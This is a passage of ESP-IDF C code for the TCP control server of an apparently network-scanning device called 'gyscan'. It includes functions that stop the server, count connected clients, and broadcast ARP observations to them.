    esp_err_t ret = xTaskCreate(server_task, "tcp_srv", 4096, NULL, 6, &s_server_task);
    if (ret != pdPASS) {
        s_running = false;
        s_server_task = NULL;
        return ESP_FAIL;
    }
    ESP_LOGI(TAG, "gyscan 控制服务器任务已创建(端口 %d)", CONFIG_GYSCAN_TCP_PORT);
    return ESP_OK;
}

void tcp_server_stop(void)
{
    s_running = false;
    if (s_listen_fd >= 0) {
        shutdown(s_listen_fd, 0);
        close(s_listen_fd);
        s_listen_fd = -1;
    }
    xSemaphoreTake(s_clients_lock, portMAX_DELAY);
    for (int i = 0; i < TCP_SERVER_MAX_CLIENTS; i++) {
        if (s_clients[i].fd >= 0) {
            shutdown(s_clients[i].fd, 0);
            close(s_clients[i].fd);
            s_clients[i].fd = -1;
        }
    }
    xSemaphoreGive(s_clients_lock);
    s_server_task = NULL;
}

bool tcp_server_is_running(void)
{
    return s_running && s_listen_fd >= 0;
}

int tcp_server_client_count(void)
{
    int count = 0;
    xSemaphoreTake(s_clients_lock, pdMS_TO_TICKS(100));
    for (int i = 0; i < TCP_SERVER_MAX_CLIENTS; i++) {
        if (s_clients[i].fd >= 0) {
            count++;
        }
    }
    xSemaphoreGive(s_clients_lock);
    return count;
}

void tcp_server_arp_forward(const char *data)
{
    if (data == NULL || *data == '\0') {
        return;
    }
    broadcast("ARP %s\n", data);
}

